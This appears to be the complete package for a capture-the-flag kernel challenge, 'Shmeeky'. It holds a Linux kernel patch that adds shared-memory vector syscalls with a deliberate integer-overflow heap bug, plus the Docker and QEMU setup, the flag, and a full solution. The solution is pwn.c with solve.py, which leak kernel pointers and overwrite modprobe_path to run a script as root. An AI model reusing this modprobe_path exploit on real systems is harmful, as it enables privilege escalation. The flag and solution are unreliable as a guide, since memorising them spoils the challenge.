{
    "Dockerfile": "FROM debian:bookworm-slim\n\nRUN apt-get update -y && apt-get install -y socat qemu-system procps\n\nRUN mkdir /pwn\n\nWORKDIR /pwn\n\nADD flag.txt flag.txt\nADD start.sh start.sh\nADD run_socat.sh run_socat.sh\nADD bzImage bzImage\nADD rootfs.cpio rootfs.cpio\nRUN chmod +x start.sh\nRUN chmod +x run_socat.sh\n\nEXPOSE 7007\nCMD [\"/pwn/run_socat.sh\"]",
    "flag.txt": "gigem{wh47_d0_y0u_m34n_numb3r5_c4n_0v3rfl0w?}",
    "kernel.diff": "diff --git a/Makefile b/Makefile\nindex 7214f075e..b70b7ae37 100644\n--- a/Makefile\n+++ b/Makefile\n@@ -1086,7 +1086,7 @@ export MODORDER := $(extmod_prefix)modules.order\n export MODULES_NSDEPS := $(extmod_prefix)modules.nsdeps\n \n ifeq ($(KBUILD_EXTMOD),)\n-core-y\t\t\t+= kernel/ certs/ mm/ fs/ ipc/ security/ crypto/\n+core-y\t\t\t+= kernel/ certs/ mm/ fs/ ipc/ security/ crypto/ shmvec/\n core-$(CONFIG_BLOCK)\t+= block/\n \n vmlinux-dirs\t:= $(patsubst %/,%,$(filter %/, \\\n@@ -1960,4 +1960,4 @@ FORCE:\n \n # Declare the contents of the PHONY variable as phony.  We keep that\n # information in a variable so we can use it in if_changed and friends.\n-.PHONY: $(PHONY)\n+.PHONY: $(PHONY)\n\\ No newline at end of file\ndiff --git a/arch/x86/entry/syscalls/syscall_64.tbl b/arch/x86/entry/syscalls/syscall_64.tbl\nindex c84d12608..0602ec6f7 100644\n--- a/arch/x86/entry/syscalls/syscall_64.tbl\n+++ b/arch/x86/entry/syscalls/syscall_64.tbl\n@@ -417,3 +417,10 @@\n 547\tx32\tpwritev2\t\tcompat_sys_pwritev64v2\n # This is the end of the legacy x32 range.  Numbers 548 and above are\n # not special and are not to be used for x32-specific syscalls.\n+\n+\n+600 64 shmvec_init\t\tsys_shmvec_init\n+601 64 shmvec_close\t\tsys_shmvec_close\n+602 64 shmvec_set\t\tsys_shmvec_set\n+603 64 shmvec_get\t\tsys_shmvec_get\n+604 64 shmvec_len\t\tsys_shmvec_len\n\\ No newline at end of file\ndiff --git a/include/linux/syscalls.h b/include/linux/syscalls.h\nindex 819c0cb00..4210fb32c 100644\n--- a/include/linux/syscalls.h\n+++ b/include/linux/syscalls.h\n@@ -1389,4 +1389,11 @@ int __sys_getsockopt(int fd, int level, int optname, char __user *optval,\n \t\tint __user *optlen);\n int __sys_setsockopt(int fd, int level, int optname, char __user *optval,\n \t\tint optlen);\n-#endif\n+\n+asmlinkage long sys_shmvec_init(uint64_t count);\n+asmlinkage long sys_shmvec_close(void);\n+asmlinkage long sys_shmvec_set(uint64_t index, uint64_t data);\n+asmlinkage long sys_shmvec_get(uint64_t index, uint64_t* dest );\n+asmlinkage long sys_shmvec_len(uint64_t* dest);\n+\n+#endif\n\\ No newline at end of file\ndiff --git a/shmvec/Makefile b/shmvec/Makefile\nnew file mode 100644\nindex 000000000..01a97ebd5\n--- /dev/null\n+++ b/shmvec/Makefile\n@@ -0,0 +1 @@\n+obj-y := shmvec.o\n\\ No newline at end of file\ndiff --git a/shmvec/shmvec.c b/shmvec/shmvec.c\nnew file mode 100644\nindex 000000000..e54f1e943\n--- /dev/null\n+++ b/shmvec/shmvec.c\n@@ -0,0 +1,60 @@\n+#include <linux/kernel.h>\n+#include <linux/slab.h>\n+#include <asm/uaccess.h>\n+#include <linux/syscalls.h>\n+\n+struct {\n+\tuint64_t* vec;\n+\tuint64_t length;\n+} shmvec_state;\n+\n+SYSCALL_DEFINE1(shmvec_init, uint64_t, count)\n+{\n+\tif((count * sizeof(uint64_t)) < 128 * 1000 * 1000) {\n+\t\tshmvec_state.vec = (uint64_t*) kmalloc(count * sizeof(uint64_t), GFP_KERNEL);\n+\t\tshmvec_state.length = count;\n+\t\treturn 0;\n+\t} else {\n+\t\treturn -1;\n+\t}\n+\t\n+}\n+\n+SYSCALL_DEFINE0(shmvec_close)\n+{\n+\tkfree(shmvec_state.vec);\n+\tshmvec_state.vec = NULL;\n+\tshmvec_state.length = 0;\n+\treturn 0;\n+}\n+\n+\n+SYSCALL_DEFINE2(shmvec_set, uint64_t, index, uint64_t, data)\n+{\n+\tif(shmvec_state.vec && index < shmvec_state.length) {\n+\t\tshmvec_state.vec[index] = data;\n+\t\treturn 0;\n+\t} else {\n+\t\treturn -1;\n+\t}\n+}\n+\n+\n+SYSCALL_DEFINE2(shmvec_get, uint64_t, index, uint64_t __user *, dest )\n+{\n+\tif(shmvec_state.vec && index < shmvec_state.length) {\n+\t\tput_user(shmvec_state.vec[index], dest);\n+\t\treturn 0;\n+\t} else {\n+\t\treturn -1;\n+\t}\n+\n+}\n+\n+SYSCALL_DEFINE1(shmvec_len, uint64_t*, dest)\n+{\n+\t\tput_user(shmvec_state.length, dest);\n+        return 0;\n+}\n+\n+",
    "Makefile": "docker: Dockerfile\n\tdocker build -t shmeeky  .\n\nrun: docker\n\tdocker run -d --restart=always --name shmeeky -p 7007:7007 shmeeky\n\n.PHONY:",
    "pwn.c": "#include <unistd.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n\n\nuint64_t modprobe_path_value = 0x6f6d2f6e6962732f;\n\nvoid main() {\n\tsyscall(600,0x2000000000000001); // initialize with 0 heap alloc and beeg count\n\n\tuint64_t i_0;\n\tsyscall(603,0, &i_0);\n\tprintf(\"vec[0] = %lx\\n\", i_0);\n\n\tuint64_t ptr_into_text;\n\tfor(long i = 0; i < 1000; i++) {\n\t\tuint64_t ptr;\n\t\tsyscall(603,i, &ptr);\n\t\tif ((ptr >> 32 == 0xffffffff)  && ((ptr & 0xffff) == 0x92cd)) { // \n\t\t\tptr_into_text = ptr;\n\t\t\tprintf(\"vec[%ld] = %lx\\n\",i, ptr);\t\n\t\t}\n\t}\n\tif (ptr_into_text==0) {\n\t\tprintf(\"couldn't find ptr into text???\");\n\t\texit(1);\n\t}\n\n\tuint64_t modprobe_path = ptr_into_text + 0x277a73;\n\tprintf(\"&modprobe_path = %lx\\n\", modprobe_path);\n\tuint64_t distance_to_modprobe_path = ((modprobe_path - i_0) / 8) + 1;\n\n\tuint64_t offset_to_modprobe_path = 0;\n\tfor(long i = 0; i < 1000; i++) {\n\t\tuint64_t ptr;\n\t\tsyscall(603,distance_to_modprobe_path+i, &ptr);\n\t\tif (ptr == modprobe_path_value) { // \n\t\t\toffset_to_modprobe_path = distance_to_modprobe_path +i;\n\t\t\tprintf(\"vec[%ld] = %lx\\n\",distance_to_modprobe_path+i, ptr);\t\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (offset_to_modprobe_path==0) {\n\t\tprintf(\"couldn't find modprobe_path offset???\");\n\t\texit(1);\n\t}\n\n\tsyscall(602,offset_to_modprobe_path, 0x77702f656d6f682f);\n\tsyscall(602,offset_to_modprobe_path+1, 0x782f6e);\n\tsystem(\"echo -ne \\\"#!/bin/sh\\ncp /dev/sda /tmp/flag\\nchmod 777 /tmp/flag\\\" > x\");\n\tsystem(\"echo -ne \\\"\\xff\\xff\\xff\\xff\\\" > dummy\");\n\tsystem(\"chmod +x ./dummy\");\n\tsystem(\"chmod +x ./x\");\n\tsystem(\"./dummy\");\n\tsystem(\"cat /tmp/flag\");\n}\n",
    "readme.md": "# Shmeeky\n\n## Description\nShared memory vector in kernel space written in 15 minutes?  What could go wrong!\n\nbzImage rootfs.cpio start.sh kernel.diff\n\nlog in with user \"pwn\" and no password\n\nbzImage built by applying kernel.diff to https://github.com/torvalds/linux/commit/40037e4f8b2f7d33b8d266f139bf345962c48d46\n\nrootfs is buildroot 2022.02 with glibc 2.34\n\n## Solution\nSee `solve.py`.",
    "run_socat.sh": "#!/bin/sh\nsocat -dd TCP4-LISTEN:7007,fork,reuseaddr EXEC:'./start.sh',pty,echo=0,rawer,iexten=0\n",
    "solve.py": "from pwn import *\n\nimport os\n\nr = connect(\"127.0.0.1\",7007)\n\nr.recvuntil(b\"buildroot login\")\nr.sendline(b\"pwn\")\n\ndef send_shell(cmd):\n\tr.sendline(cmd)\n\tr.recvline()\n\treturn r.recvuntil(b\"$\", drop=True).replace(b'\\r',b'').decode(errors=\"ignore\")\n\nfrom base64 import b64encode\n\ndef chunks(lst, n):\n    \"\"\"Yield successive n-sized chunks from lst.\"\"\"\n    for i in range(0, len(lst), n):\n        yield lst[i:i + n]\n\nwith open(\"pwn\", \"rb\") as f:\n\tdata = f.read()\n\n\tchunk_size = 256\n\tsend_shell(\"touch pwn\")\n\tfor (i, chunk) in enumerate(chunks(data, chunk_size)):\n\t\tif i % 8 == 0:\n\t\t\tprint(f\"{i * chunk_size}/{len(data)}\")\n\n\t\tsend_shell(f\"echo {b64encode(chunk).decode()} | base64 -d >> pwn\")\n\n\nprint(send_shell(b\"chmod +x ./pwn\"))\nprint(send_shell(b\"./pwn\"))\n\nr.interactive()",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"shmeeky\")\np.interactive()\n",
    "start.sh": "#!/bin/bash\n\nfunction cleanup {\n  pkill -P $$\n}\ntrap cleanup exit\n\nqemu-system-x86_64 \\\n    -m 128M \\\n    -cpu kvm64 \\\n    -kernel bzImage \\\n    -initrd rootfs.cpio \\\n    -hdb flag.txt \\\n    -snapshot \\\n    -nographic \\\n    -monitor /dev/null \\\n    -no-reboot \\\n    -append \"rootwait root=/dev/vda console=ttyS0 kpti=1 quiet panic=1 kaslr\" \\\n",
    "category": "pwn"
}